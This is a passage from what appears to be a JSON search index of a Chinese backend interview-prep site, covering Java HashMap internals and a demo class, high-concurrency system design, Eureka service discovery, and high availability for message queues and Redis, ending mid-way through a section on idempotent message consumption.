((TreeNode\u0026lt;K,V\u0026gt;)first).getTreeNode(hash, key); // 在链表中get  do { if (e.hash == hash \u0026amp;\u0026amp; ((k = e.key) == key || (key != null \u0026amp;\u0026amp; key.equals(k)))) return e; } while ((e = e.next) != null); } } return null; } resize 方法    进行扩容，会伴随着一次重新 hash 分配，并且会遍历 hash 表中所有的元素，是非常耗时的。在编写程序中，要尽量避免 resize。\nfinal Node\u0026lt;K,V\u0026gt;[] resize() { Node\u0026lt;K,V\u0026gt;[] oldTab = table; int oldCap = (oldTab == null) ? 0 : oldTab.length; int oldThr = threshold; int newCap, newThr = 0; if (oldCap \u0026gt; 0) { // 超过最大值就不再扩充了，就只好随你碰撞去吧  if (oldCap \u0026gt;= MAXIMUM_CAPACITY) { threshold = Integer.MAX_VALUE; return oldTab; } // 没超过最大值，就扩充为原来的2倍  else if ((newCap = oldCap \u0026lt;\u0026lt; 1) \u0026lt; MAXIMUM_CAPACITY \u0026amp;\u0026amp; oldCap \u0026gt;= DEFAULT_INITIAL_CAPACITY) newThr = oldThr \u0026lt;\u0026lt; 1; // double threshold  } else if (oldThr \u0026gt; 0) // initial capacity was placed in threshold  newCap = oldThr; else { // signifies using defaults  newCap = DEFAULT_INITIAL_CAPACITY; newThr = (int)(DEFAULT_LOAD_FACTOR * DEFAULT_INITIAL_CAPACITY); } // 计算新的resize上限  if (newThr == 0) { float ft = (float)newCap * loadFactor; newThr = (newCap \u0026lt; MAXIMUM_CAPACITY \u0026amp;\u0026amp; ft \u0026lt; (float)MAXIMUM_CAPACITY ? (int)ft : Integer.MAX_VALUE); } threshold = newThr; @SuppressWarnings({\u0026#34;rawtypes\u0026#34;,\u0026#34;unchecked\u0026#34;}) Node\u0026lt;K,V\u0026gt;[] newTab = (Node\u0026lt;K,V\u0026gt;[])new Node[newCap]; table = newTab; if (oldTab != null) { // 把每个bucket都移动到新的buckets中  for (int j = 0; j \u0026lt; oldCap; ++j) { Node\u0026lt;K,V\u0026gt; e; if ((e = oldTab[j]) != null) { oldTab[j] = null; if (e.next == null) newTab[e.hash \u0026amp; (newCap - 1)] = e; else if (e instanceof TreeNode) ((TreeNode\u0026lt;K,V\u0026gt;)e).split(this, newTab, j, oldCap); else { Node\u0026lt;K,V\u0026gt; loHead = null, loTail = null; Node\u0026lt;K,V\u0026gt; hiHead = null, hiTail = null; Node\u0026lt;K,V\u0026gt; next; do { next = e.next; // 原索引  if ((e.hash \u0026amp; oldCap) == 0) { if (loTail == null) loHead = e; else loTail.next = e; loTail = e; } // 原索引+oldCap  else { if (hiTail == null) hiHead = e; else hiTail.next = e; hiTail = e; } } while ((e = next) != null); // 原索引放到bucket里  if (loTail != null) { loTail.next = null; newTab[j] = loHead; } // 原索引+oldCap放到bucket里  if (hiTail != null) { hiTail.next = null; newTab[j + oldCap] = hiHead; } } } } } return newTab; } HashMap 常用方法测试    package map; import java.util.Collection; import java.util.HashMap; import java.util.Set; public class HashMapDemo { public static void main(String[] args) { HashMap\u0026lt;String, String\u0026gt; map = new HashMap\u0026lt;String, String\u0026gt;(); // 键不能重复，值可以重复  map.put(\u0026#34;san\u0026#34;, \u0026#34;张三\u0026#34;); map.put(\u0026#34;si\u0026#34;, \u0026#34;李四\u0026#34;); map.put(\u0026#34;wu\u0026#34;, \u0026#34;王五\u0026#34;); map.put(\u0026#34;wang\u0026#34;, \u0026#34;老王\u0026#34;); map.put(\u0026#34;wang\u0026#34;, \u0026#34;老王2\u0026#34;);// 老王被覆盖  map.put(\u0026#34;lao\u0026#34;, \u0026#34;老王\u0026#34;); System.out.println(\u0026#34;-------直接输出hashmap:-------\u0026#34;); System.out.println(map); /** * 遍历HashMap */ // 1.获取Map中的所有键  System.out.println(\u0026#34;-------foreach获取Map中所有的键:------\u0026#34;); Set\u0026lt;String\u0026gt; keys = map.keySet(); for (String key : keys) { System.out.print(key+\u0026#34; \u0026#34;); } System.out.println();//换行  // 2.获取Map中所有值  System.out.println(\u0026#34;-------foreach获取Map中所有的值:------\u0026#34;); Collection\u0026lt;String\u0026gt; values = map.values(); for (String value : values) { System.out.print(value+\u0026#34; \u0026#34;); } System.out.println();//换行  // 3.得到key的值的同时得到key所对应的值  System.out.println(\u0026#34;-------得到key的值的同时得到key所对应的值:-------\u0026#34;); Set\u0026lt;String\u0026gt; keys2 = map.keySet(); for (String key : keys2) { System.out.print(key + \u0026#34;：\u0026#34; + map.get(key)+\u0026#34; \u0026#34;); } /** * 如果既要遍历key又要value，那么建议这种方式，因为如果先获取keySet然后再执行map.get(key)，map内部会执行两次遍历。 * 一次是在获取keySet的时候，一次是在遍历所有key的时候。 */ // 当我调用put(key,value)方法的时候，首先会把key和value封装到  // Entry这个静态内部类对象中，把Entry对象再添加到数组中，所以我们想获取  // map中的所有键值对，我们只要获取数组中的所有Entry对象，接下来  // 调用Entry对象中的getKey()和getValue()方法就能获取键值对了  Set\u0026lt;java.util.Map.Entry\u0026lt;String, String\u0026gt;\u0026gt; entrys = map.entrySet(); for (java.util.Map.Entry\u0026lt;String, String\u0026gt; entry : entrys) { System.out.println(entry.getKey() + \u0026#34;--\u0026#34; + entry.getValue()); } /** * HashMap其他常用方法 */ System.out.println(\u0026#34;after map.size()：\u0026#34;+map.size()); System.out.println(\u0026#34;after map.isEmpty()：\u0026#34;+map.isEmpty()); System.out.println(map.remove(\u0026#34;san\u0026#34;)); System.out.println(\u0026#34;after map.remove()：\u0026#34;+map); System.out.println(\u0026#34;after map.get(si)：\u0026#34;+map.get(\u0026#34;si\u0026#34;)); System.out.println(\u0026#34;after map.containsKey(si)：\u0026#34;+map.containsKey(\u0026#34;si\u0026#34;)); System.out.println(\u0026#34;after containsValue(李四)：\u0026#34;+map.containsValue(\u0026#34;李四\u0026#34;)); System.out.println(map.replace(\u0026#34;si\u0026#34;, \u0026#34;李四2\u0026#34;)); System.out.println(\u0026#34;after map.replace(si, 李四2):\u0026#34;+map); } } "},{"id":184,"href":"/%E9%AB%98%E5%B9%B6%E5%8F%91/high-concurrency-design/","title":"high-concurrency-design","parent":"高并发","content":"面试题    如何设计一个高并发系统？\n面试官心理分析    说实话，如果面试官问你这个题目，那么你必须要使出全身吃奶劲了。为啥？因为你没看到现在很多公司招聘的 JD 里都是说啥，有高并发就经验者优先。\n如果你确实有真才实学，在互联网公司里干过高并发系统，那你确实拿 offer 基本如探囊取物，没啥问题。面试官也绝对不会这样来问你，否则他就是蠢。\n假设你在某知名电商公司干过高并发系统，用户上亿，一天流量几十亿，高峰期并发量上万，甚至是十万。那么人家一定会仔细盘问你的系统架构，你们系统啥架构？怎么部署的？部署了多少台机器？缓存咋用的？MQ 咋用的？数据库咋用的？就是深挖你到底是如何扛住高并发的。\n因为真正干过高并发的人一定知道，脱离了业务的系统架构都是在纸上谈兵，真正在复杂业务场景而且还高并发的时候，那系统架构一定不是那么简单的，用个 redis，用 mq 就能搞定？当然不是，真实的系统架构搭配上业务之后，会比这种简单的所谓“高并发架构”要复杂很多倍。\n如果有面试官问你个问题说，如何设计一个高并发系统？那么不好意思，一定是因为你实际上没干过高并发系统。面试官看你简历就没啥出彩的，感觉就不咋地，所以就会问问你，如何设计一个高并发系统？其实说白了本质就是看看你有没有自己研究过，有没有一定的知识积累。\n最好的当然是招聘个真正干过高并发的哥儿们咯，但是这种哥儿们人数稀缺，不好招。所以可能次一点的就是招一个自己研究过的哥儿们，总比招一个啥也不会的哥儿们好吧！\n所以这个时候你必须得做一把个人秀了，秀出你所有关于高并发的知识！\n面试题剖析    其实所谓的高并发，如果你要理解这个问题呢，其实就得从高并发的根源出发，为啥会有高并发？为啥高并发就很牛逼？\n我说的浅显一点，很简单，就是因为刚开始系统都是连接数据库的，但是要知道数据库支撑到每秒并发两三千的时候，基本就快完了。所以才有说，很多公司，刚开始干的时候，技术比较 low，结果业务发展太快，有的时候系统扛不住压力就挂了。\n当然会挂了，凭什么不挂？你数据库如果瞬间承载每秒 5000/8000，甚至上万的并发，一定会宕机，因为比如 mysql 就压根儿扛不住这么高的并发量。\n所以为啥高并发牛逼？就是因为现在用互联网的人越来越多，很多 app、网站、系统承载的都是高并发请求，可能高峰期每秒并发量几千，很正常的。如果是什么双十一之类的，每秒并发几万几十万都有可能。\n那么如此之高的并发量，加上原本就如此之复杂的业务，咋玩儿？真正厉害的，一定是在复杂业务系统里玩儿过高并发架构的人，但是你没有，那么我给你说一下你该怎么回答这个问题：\n可以分为以下 6 点：\n 系统拆分 缓存 MQ 分库分表 读写分离 ElasticSearch  系统拆分    将一个系统拆分为多个子系统，用 dubbo 来搞。然后每个系统连一个数据库，这样本来就一个库，现在多个数据库，不也可以扛高并发么。\n缓存    缓存，必须得用缓存。大部分的高并发场景，都是读多写少，那你完全可以在数据库和缓存里都写一份，然后读的时候大量走缓存不就得了。毕竟人家 redis 轻轻松松单机几万的并发。所以你可以考虑考虑你的项目里，那些承载主要请求的读场景，怎么用缓存来抗高并发。\nMQ    MQ，必须得用 MQ。可能你还是会出现高并发写的场景，比如说一个业务操作里要频繁搞数据库几十次，增删改增删改，疯了。那高并发绝对搞挂你的系统，你要是用 redis 来承载写那肯定不行，人家是缓存，数据随时就被 LRU 了，数据格式还无比简单，没有事务支持。所以该用 mysql 还得用 mysql 啊。那你咋办？用 MQ 吧，大量的写请求灌入 MQ 里，排队慢慢玩儿，后边系统消费后慢慢写，控制在 mysql 承载范围之内。所以你得考虑考虑你的项目里，那些承载复杂写业务逻辑的场景里，如何用 MQ 来异步写，提升并发性。MQ 单机抗几万并发也是 ok 的，这个之前还特意说过。\n分库分表    分库分表，可能到了最后数据库层面还是免不了抗高并发的要求，好吧，那么就将一个数据库拆分为多个库，多个库来扛更高的并发；然后将一个表拆分为多个表，每个表的数据量保持少一点，提高 sql 跑的性能。\n读写分离    读写分离，这个就是说大部分时候数据库可能也是读多写少，没必要所有请求都集中在一个库上吧，可以搞个主从架构，主库写入，从库读取，搞一个读写分离。读流量太多的时候，还可以加更多的从库。\nElasticSearch    Elasticsearch，简称 es。es 是分布式的，可以随便扩容，分布式天然就可以支撑高并发，因为动不动就可以扩容加机器来扛更高的并发。那么一些比较简单的查询、统计类的操作，可以考虑用 es 来承载，还有一些全文搜索类的操作，也可以考虑用 es 来承载。\n上面的 6 点，基本就是高并发系统肯定要干的一些事儿，大家可以仔细结合之前讲过的知识考虑一下，到时候你可以系统的把这块阐述一下，然后每个部分要注意哪些问题，之前都讲过了，你都可以阐述阐述，表明你对这块是有点积累的。\n说句实话，毕竟你真正厉害的一点，不是在于弄明白一些技术，或者大概知道一个高并发系统应该长什么样？其实实际上在真正的复杂的业务系统里，做高并发要远远比上面提到的点要复杂几十倍到上百倍。你需要考虑：哪些需要分库分表，哪些不需要分库分表，单库单表跟分库分表如何 join，哪些数据要放到缓存里去，放哪些数据才可以扛住高并发的请求，你需要完成对一个复杂业务系统的分析之后，然后逐步逐步的加入高并发的系统架构的改造，这个过程是无比复杂的，一旦做过一次，并且做好了，你在这个市场上就会非常的吃香。\n其实大部分公司，真正看重的，不是说你掌握高并发相关的一些基本的架构知识，架构中的一些技术，RocketMQ、Kafka、Redis、Elasticsearch，高并发这一块，你了解了，也只能是次一等的人才。对一个有几十万行代码的复杂的分布式系统，一步一步架构、设计以及实践过高并发架构的人，这个经验是难能可贵的。\n"},{"id":185,"href":"/%E5%BE%AE%E8%BD%AF%E6%9C%8D%E5%8A%A1/how-eureka-enable-service-discovery-and-service-registration/","title":"how-eureka-enable-service-discovery-and-service-registration","parent":"微软服务","content":"服务发现组件 Eureka 的几个主要调用过程     Author: mghio Description: 该文主要讲述服务发现组件 Eureka 的几个主要调用过程  前言    现在流行的微服务体系结构正在改变我们构建应用程序的方式，从单一的单体服务转变为越来越小的可单独部署的服务（称为 微服务 ），共同构成了我们的应用程序。当进行一个业务时不可避免就会存在多个服务之间调用，假如一个服务 A 要访问在另一台服务器部署的服务 B，那么前提是服务 A 要知道服务 B 所在机器的 IP 地址和服务对应的端口，最简单的方式就是让服务 A 自己去维护一份服务 B 的配置（包含 IP 地址和端口等信息），但是这种方式有几个明显的缺点：随着我们调用服务数量的增加，配置文件该如何维护；缺乏灵活性，如果服务 B 改变 IP 地址或者端口，服务 A 也要修改相应的文件配置；还有一个就是进行服务的动态扩容或缩小不方便。 一个比较好的解决方案就是 服务发现（Service Discovery） 。它抽象出来了一个注册中心，当一个新的服务上线时，它会将自己的 IP 和端口注册到注册中心去，会对注册的服务进行定期的心跳检测，当发现服务状态异常时将其从注册中心剔除下线。服务 A 只要从注册中心中获取服务 B 的信息即可，即使当服务 B 的 IP 或者端口变更了，服务 A 也无需修改，从一定程度上解耦了服务。服务发现目前业界有很多开源的实现，比如 apache 的 zookeeper、 Netflix 的 eureka、 hashicorp 的 consul、 CoreOS 的 etcd。\nEureka 是什么    Eureka 在 GitHub 上对其的定义为\n Eureka is a REST (Representational State Transfer) based service that is primarily used in the AWS cloud for locating services for the purpose of load balancing and failover of middle-tier servers.\n At Netflix, Eureka is used for the following purposes apart from playing a critical part in mid-tier load balancing.\nEureka 是由 Netflix 公司开源，采用的是 Client / Server 模式进行设计，基于 http 协议和使用 Restful Api 开发的服务注册与发现组件，提供了完整的服务注册和服务发现，可以和 Spring Cloud 无缝集成。其中 Server 端扮演着服务注册中心的角色，主要是为 Client 端提供服务注册和发现等功能，维护着 Client 端的服务注册信息，同时定期心跳检测已注册的服务当不可用时将服务剔除下线，Client 端可以通过 Server 端获取自身所依赖服务的注册信息，从而完成服务间的调用。遗憾的是从其官方的 github wiki 可以发现，2.0 版本已经不再开源。但是不影响我们对其进行深入了解，毕竟服务注册、服务发现相对来说还是比较基础和通用的，其它开源实现框架的思想也是想通的。\n服务注册中心（Eureka Server）    我们在项目中引入 Eureka Server 的相关依赖，然后在启动类加上注解 @EnableEurekaServer ，就可以将其作为注册中心，启动服务后访问页面如下：\n我们继续添加两个模块 service-provider ， service-consumer ，然后在启动类加上注解 @EnableEurekaClient 并指定注册中心地址为我们刚刚启动的 Eureka Server ，再次访问可以看到两个服务都已经注册进来了。\nDemo 仓库地址：https://github.com/mghio/depth-in-springcloud\n可以看到 Eureka 的使用非常简单，只需要添加几个注解和配置就实现了服务注册和服务发现，接下来我们看看它是如何实现这些功能的。\n服务注册（Register）    注册中心提供了服务注册接口，用于当有新的服务启动后进行调用来实现服务注册，或者心跳检测到服务状态异常时，变更对应服务的状态。服务注册就是发送一个 POST 请求带上当前实例信息到类 ApplicationResource 的 addInstance 方法进行服务注册。\n可以看到方法调用了类 PeerAwareInstanceRegistryImpl 的 register 方法，该方法主要分为两步：\n 调用父类 AbstractInstanceRegistry 的 register 方法把当前服务注册到注册中心 调用 replicateToPeers 方法使用异步的方式向其它的 Eureka Server 节点同步服务注册信息  服务注册信息保存在一个嵌套的 map 中，它的结构如下：\n第一层 map 的 key 是应用名称（对应 Demo 里的 SERVICE-PROVIDER ），第二层 map 的 key 是应用对应的实例名称（对应 Demo 里的 mghio-mbp:service-provider:9999 ），一个应用可以有多个实例，主要调用流程如下图所示：\n服务续约（Renew）    服务续约会由服务提供者（比如 Demo 中的 service-provider ）定期调用，类似于心跳，用来告知注册中心 Eureka Server 自己的状态，避免被 Eureka Server 认为服务时效将其剔除下线。服务续约就是发送一个 PUT 请求带上当前实例信息到类 InstanceResource 的 renewLease 方法进行服务续约操作。\n进入到 PeerAwareInstanceRegistryImpl 的 renew 方法可以看到，服务续约步骤大体上和服务注册一致，先更新当前 Eureka Server 节点的状态，服务续约成功后再用异步的方式同步状态到其它 Eureka Server 节上，主要调用流程如下图所示：\n服务下线（Cancel）    当服务提供者（比如 Demo 中的 service-provider ）停止服务时，会发送请求告知注册中心 Eureka Server 进行服务剔除下线操作，防止服务消费者从注册中心调用到不存在的服务。服务下线就是发送一个 DELETE 请求带上当前实例信息到类 InstanceResource 的 cancelLease 方法进行服务剔除下线操作。\n进入到 PeerAwareInstanceRegistryImpl 的 cancel 方法可以看到，服务续约步骤大体上和服务注册一致，先在当前 Eureka Server 节点剔除下线该服务，服务下线成功后再用异步的方式同步状态到其它 Eureka Server 节上，主要调用流程如下图所示：\n服务剔除（Eviction）    服务剔除是注册中心 Eureka Server 在启动时就启动一个守护线程 evictionTimer 来定期（默认为 60 秒）执行检测服务的，判断标准就是超过一定时间没有进行 Renew 的服务，默认的失效时间是 90 秒，也就是说当一个已注册的服务在 90 秒内没有向注册中心 Eureka Server 进行服务续约（Renew），就会被从注册中心剔除下线。失效时间可以通过配置 eureka.instance.leaseExpirationDurationInSeconds 进行修改，定期执行检测服务可以通过配置 eureka.server.evictionIntervalTimerInMs 进行修改，主要调用流程如下图所示：\n服务提供者（Service Provider）    对于服务提供方（比如 Demo 中的 service-provider 服务）来说，主要有三大类操作，分别为 服务注册（Register） 、 服务续约（Renew） 、 服务下线（Cancel） ，接下来看看这三个操作是如何实现的。\n服务注册（Register）    一个服务要对外提供服务，首先要在注册中心 Eureka Server 进行服务相关信息注册，能进行这一步的前提是你要配置 eureka.client.register-with-eureka=true ，这个默认值为 true ，注册中心不需要把自己注册到注册中心去，把这个配置设为 false ，这个调用比较简单，主要调用流程如下图所示：\n服务续约（Renew）    服务续约是由服务提供者方定期（默认为 30 秒）发起心跳的，主要是用来告知注册中心 Eureka Server 自己状态是正常的还活着，可以通过配置 eureka.instance.lease-renewal-interval-in-seconds 来修改，当然服务续约的前提是要配置 eureka.client.register-with-eureka=true ，将该服务注册到注册中心中去，主要调用流程如下图所示：\n服务下线（Cancel）    当服务提供者方服务停止时，要发送 DELETE 请求告知注册中心 Eureka Server 自己已经下线，好让注册中心将自己剔除下线，防止服务消费方从注册中心获取到不可用的服务。这个过程实现比较简单，在类 DiscoveryClient 的 shutdown 方法加上注解 @PreDestroy ，当服务停止时会自动触发服务剔除下线，执行服务下线逻辑，主要调用流程如下图所示：\n服务消费者（Service Consumer）    这里的服务消费者如果不需要被其它服务调用的话，其实只会涉及到两个操作，分别是从注册中心 获取服务列表（Fetch） 和 更新服务列表（Update） 。如果同时也需要注册到注册中心对外提供服务的话，那么剩下的过程和上文提到的服务提供者是一致的，这里不再阐述，接下来看看这两个操作是如何实现的。\n获取服务列表（Fetch）    服务消费者方启动之后首先肯定是要先从注册中心 Eureka Server 获取到可用的服务列表同时本地也会缓存一份。这个获取服务列表的操作是在服务启动后 DiscoverClient 类实例化的时候执行的。\n可以看出，能发生这个获取服务列表的操作前提是要保证配置了 eureka.client.fetch-registry=true ，该配置的默认值为 true ，主要调用流程如下图所示：\n更新服务列表（Update）    由上面的 获取服务列表（Fetch） 操作过程可知，本地也会缓存一份，所以这里需要定期的去到注册中心 Eureka Server 获取服务的最新配置，然后比较更新本地缓存，这个更新的间隔时间可以通过配置 eureka.client.registry-fetch-interval-seconds 修改，默认为 30 秒，能进行这一步更新服务列表的前提是你要配置 eureka.client.register-with-eureka=true ，这个默认值为 true 。主要调用流程如下图所示：\n总结    工作中项目使用的是 Spring Cloud 技术栈，它有一套非常完善的开源代码来整合 Eureka ，使用起来非常方便。之前都是直接加注解和修改几个配置属性一气呵成的，没有深入了解过源码实现，本文主要是阐述了服务注册、服务发现等相关过程和实现方式，对 Eureka 服务发现组件有了更近一步的了解。\n 参考文章\nNetflix Eureka\nService Discovery in a Microservices Architecture\n"},{"id":186,"href":"/%E9%AB%98%E5%B9%B6%E5%8F%91/how-to-ensure-high-availability-of-message-queues/","title":"how-to-ensure-high-availability-of-message-queues","parent":"高并发","content":"面试题    如何保证消息队列的高可用？\n面试官心理分析    如果有人问到你 MQ 的知识，高可用是必问的。上一讲提到，MQ 会导致系统可用性降低。所以只要你用了 MQ，接下来问的一些要点肯定就是围绕着 MQ 的那些缺点怎么来解决了。\n要是你傻乎乎的就干用了一个 MQ，各种问题从来没考虑过，那你就杯具了，面试官对你的感觉就是，只会简单使用一些技术，没任何思考，马上对你的印象就不太好了。这样的同学招进来要是做个 20k 薪资以内的普通小弟还凑合，要是做薪资 20k+ 的高工，那就惨了，让你设计个系统，里面肯定一堆坑，出了事故公司受损失，团队一起背锅。\n面试题剖析    这个问题这么问是很好的，因为不能问你 Kafka 的高可用性怎么保证？ActiveMQ 的高可用性怎么保证？一个面试官要是这么问就显得很没水平，人家可能用的就是 RabbitMQ，没用过 Kafka，你上来问人家 Kafka 干什么？这不是摆明了刁难人么。\n所以有水平的面试官，问的是 MQ 的高可用性怎么保证？这样就是你用过哪个 MQ，你就说说你对那个 MQ 的高可用性的理解。\nRabbitMQ 的高可用性    RabbitMQ 是比较有代表性的，因为是基于主从（非分布式）做高可用性的，我们就以 RabbitMQ 为例子讲解第一种 MQ 的高可用性怎么实现。\nRabbitMQ 有三种模式：单机模式、普通集群模式、镜像集群模式。\n单机模式    单机模式，就是 Demo 级别的，一般就是你本地启动了玩玩儿的，没人生产用单机模式。\n普通集群模式（无高可用性）    普通集群模式，意思就是在多台机器上启动多个 RabbitMQ 实例，每个机器启动一个。你创建的 queue，只会放在一个 RabbitMQ 实例上，但是每个实例都同步 queue 的元数据（元数据可以认为是 queue 的一些配置信息，通过元数据，可以找到 queue 所在实例）。你消费的时候，实际上如果连接到了另外一个实例，那么那个实例会从 queue 所在实例上拉取数据过来。\n这种方式确实很麻烦，也不怎么好，没做到所谓的分布式，就是个普通集群。因为这导致你要么消费者每次随机连接一个实例然后拉取数据，要么固定连接那个 queue 所在实例消费数据，前者有数据拉取的开销，后者导致单实例性能瓶颈。\n而且如果那个放 queue 的实例宕机了，会导致接下来其他实例就无法从那个实例拉取，如果你开启了消息持久化，让 RabbitMQ 落地存储消息的话，消息不一定会丢，得等这个实例恢复了，然后才可以继续从这个 queue 拉取数据。\n所以这个事儿就比较尴尬了，这就没有什么所谓的高可用性，这方案主要是提高吞吐量的，就是说让集群中多个节点来服务某个 queue 的读写操作。\n镜像集群模式（高可用性）    这种模式，才是所谓的 RabbitMQ 的高可用模式。跟普通集群模式不一样的是，在镜像集群模式下，你创建的 queue，无论元数据还是 queue 里的消息都会存在于多个实例上，就是说，每个 RabbitMQ 节点都有这个 queue 的一个完整镜像，包含 queue 的全部数据的意思。然后每次你写消息到 queue 的时候，都会自动把消息同步到多个实例的 queue 上。\n那么如何开启这个镜像集群模式呢？其实很简单，RabbitMQ 有很好的管理控制台，就是在后台新增一个策略，这个策略是镜像集群模式的策略，指定的时候是可以要求数据同步到所有节点的，也可以要求同步到指定数量的节点，再次创建 queue 的时候，应用这个策略，就会自动将数据同步到其他的节点上去了。\n这样的话，好处在于，你任何一个机器宕机了，没事儿，其它机器（节点）还包含了这个 queue 的完整数据，别的 consumer 都可以到其它节点上去消费数据。坏处在于，第一，这个性能开销也太大了吧，消息需要同步到所有机器上，导致网络带宽压力和消耗很重！第二，这么玩儿，不是分布式的，就没有扩展性可言了，如果某个 queue 负载很重，你加机器，新增的机器也包含了这个 queue 的所有数据，并没有办法线性扩展你的 queue。你想，如果这个 queue 的数据量很大，大到这个机器上的容量无法容纳了，此时该怎么办呢？\nKafka 的高可用性    Kafka 一个最基本的架构认识：由多个 broker 组成，每个 broker 是一个节点；你创建一个 topic，这个 topic 可以划分为多个 partition，每个 partition 可以存在于不同的 broker 上，每个 partition 就放一部分数据。\n这就是天然的分布式消息队列，就是说一个 topic 的数据，是分散放在多个机器上的，每个机器就放一部分数据。\n实际上 RabbitMQ 之类的，并不是分布式消息队列，它就是传统的消息队列，只不过提供了一些集群、HA(High Availability, 高可用性) 的机制而已，因为无论怎么玩儿，RabbitMQ 一个 queue 的数据都是放在一个节点里的，镜像集群下，也是每个节点都放这个 queue 的完整数据。\nKafka 0.8 以前，是没有 HA 机制的，就是任何一个 broker 宕机了，那个 broker 上的 partition 就废了，没法写也没法读，没有什么高可用性可言。\n比如说，我们假设创建了一个 topic，指定其 partition 数量是 3 个，分别在三台机器上。但是，如果第二台机器宕机了，会导致这个 topic 的 1/3 的数据就丢了，因此这个是做不到高可用的。\nKafka 0.8 以后，提供了 HA 机制，就是 replica（复制品） 副本机制。每个 partition 的数据都会同步到其它机器上，形成自己的多个 replica 副本。所有 replica 会选举一个 leader 出来，那么生产和消费都跟这个 leader 打交道，然后其他 replica 就是 follower。写的时候，leader 会负责把数据同步到所有 follower 上去，读的时候就直接读 leader 上的数据即可。只能读写 leader？很简单，要是你可以随意读写每个 follower，那么就要 care 数据一致性的问题，系统复杂度太高，很容易出问题。Kafka 会均匀地将一个 partition 的所有 replica 分布在不同的机器上，这样才可以提高容错性。\n这么搞，就有所谓的高可用性了，因为如果某个 broker 宕机了，没事儿，那个 broker 上面的 partition 在其他机器上都有副本的。如果这个宕机的 broker 上面有某个 partition 的 leader，那么此时会从 follower 中重新选举一个新的 leader 出来，大家继续读写那个新的 leader 即可。这就有所谓的高可用性了。\n写数据的时候，生产者就写 leader，然后 leader 将数据落地写本地磁盘，接着其他 follower 自己主动从 leader 来 pull 数据。一旦所有 follower 同步好数据了，就会发送 ack 给 leader，leader 收到所有 follower 的 ack 之后，就会返回写成功的消息给生产者。（当然，这只是其中一种模式，还可以适当调整这个行为）\n消费的时候，只会从 leader 去读，但是只有当一个消息已经被所有 follower 都同步成功返回 ack 的时候，这个消息才会被消费者读到。\n看到这里，相信你大致明白了 Kafka 是如何保证高可用机制的了，对吧？不至于一无所知，现场还能给面试官画画图。要是遇上面试官确实是 Kafka 高手，深挖了问，那你只能说不好意思，太深入的你没研究过。\n"},{"id":187,"href":"/%E9%AB%98%E5%B9%B6%E5%8F%91/how-to-ensure-high-concurrency-and-high-availability-of-redis/","title":"how-to-ensure-high-concurrency-and-high-availability-of-redis","parent":"高并发","content":"面试题    如何保证 redis 的高并发和高可用？redis 的主从复制原理能介绍一下么？redis 的哨兵原理能介绍一下么？\n面试官心理分析    其实问这个问题，主要是考考你，redis 单机能承载多高并发？如果单机扛不住如何扩容扛更多的并发？redis 会不会挂？既然 redis 会挂那怎么保证 redis 是高可用的？\n其实针对的都是项目中你肯定要考虑的一些问题，如果你没考虑过，那确实你对生产系统中的问题思考太少。\n面试题剖析    如果你用 redis 缓存技术的话，肯定要考虑如何用 redis 来加多台机器，保证 redis 是高并发的，还有就是如何让 redis 保证自己不是挂掉以后就直接死掉了，即 redis 高可用。\n由于此节内容较多，因此，会分为两个小节进行讲解。\n redis 主从架构 redis 基于哨兵实现高可用  redis 实现高并发主要依靠主从架构，一主多从，一般来说，很多项目其实就足够了，单主用来写入数据，单机几万 QPS，多从用来查询数据，多个从实例可以提供每秒 10w 的 QPS。\n如果想要在实现高并发的同时，容纳大量的数据，那么就需要 redis 集群，使用 redis 集群之后，可以提供每秒几十万的读写并发。\nredis 高可用，如果是做主从架构部署，那么加上哨兵就可以了，就可以实现，任何一个实例宕机，可以进行主备切换。\n"},{"id":188,"href":"/%E9%AB%98%E5%B9%B6%E5%8F%91/how-to-ensure-that-messages-are-not-repeatedly-consumed/","title":"how-to-ensure-that-messages-are-not-repeatedly-consumed","parent":"高并发","content":"面试题    如何保证消息不被重复消费？或者说，如何保证消息消费的幂等性？\n面试官心理分析    其实这是很常见的一个问题，这俩问题基本可以连起来问。既然是消费消息，那肯定要考虑会不会重复消费？能不能避免重复消费？或者重复消费了也别造成系统异常可以吗？这个是 MQ 领域的基本问题，其实本质上还是问你使用消息队列如何保证幂等性，这个是你架构里要考虑的一个问题。\n面试题剖析    回答这个问题，首先你别听到重复消息这个事儿，就一无所知吧，你先大概说一说可能会有哪些重复消费的问题。\n首先，比如 RabbitMQ、RocketMQ、Kafka，都有可能会出现消息重复消费的问题，正常。因为这问题通常不是 MQ 自己保证的，是由我们开发来保证的。挑一个 Kafka 来举个例子，说说怎么重复消费吧。\nKafka 实际上有个 offset 的概念，就是每个消息写进去，都有一个 offset，代表消息的序号，然后 consumer 消费了数据之后，每隔一段时间（定时定期），会把自己消费过的消息的 offset 提交一下，表示“我已经消费过了，下次我要是重启啥的，你就让我继续从上次消费到的 offset 来继续消费吧”。\n但是凡事总有意外，比如我们之前生产经常遇到的，就是你有时候重启系统，看你怎么重启了，如果碰到点着急的，直接 kill 进程了，再重启。这会导致 consumer 有些消息处理了，但是没来得及提交 offset，尴尬了。重启之后，少数消息会再次消费一次。\n举个栗子。\n有这么个场景。数据 1/2/3 依次进入 Kafka，Kafka 会给这三条数据每条分配一个 offset，代表这条数据的序号，我们就假设分配的 offset 依次是 152/153/154。消费者从 Kafka 去消费的时候，也是按照这个顺序去消费。假如当消费者消费了 offset=153 的这条数据，刚准备去提交 offset 到 Zookeeper，此时消费者进程被重启了。那么此时消费过的数据 1/2 的 offset 并没有提交，Kafka 也就不知道你已经消费了 offset=153 这条数据。那么重启之后，消费者会找 Kafka 说，嘿，哥儿们，你给我接着把上次我消费到的那个地方后面的数据继续给我传递过来。由于之前的 offset 没有提交成功，那么数据 1/2 会再次传过来，如果此时消费者没有去重的话，那么就会导致重复消费。\n注意：新版的 Kafka 已经将 offset 的存储从 Zookeeper 转移至 Kafka brokers，并使用内部位移主题 __consumer_offsets 进行存储。\n如果消费者干的事儿是拿一条数据就往数据库里写一条，会导致说，你可能就把数据 1/2 在数据库里插入了 2 次，那么数据就错啦。\n其实重复消费不可怕，可怕的是你没考虑到重复消费之后，怎么保证幂等性。\n举个例子吧。假设你有个系统，消费一条消息就往数据库里插入一条数据，要是你一个消息重复两次，你不就插入了两条，这数据不就错了？但是你要是消费到第二次的时候，自己判断一下是否已经消费过了，若是就直接扔了，这样不就保留了一条数据，从而保证了数据的正确性。\n一条数据重复出现两次，数据库里就只有一条数据，这就保证了系统的幂等性。\n幂等性，通俗点说，就一个数据，或者一个请求，给你重复来多次，你得确保对应的数据是不会改变的，不能出错。\n所以第二个问题来了，怎么保证消息队列消费的幂等性？\n其实还是得结合业务来思考，我这里给几个思路：\n 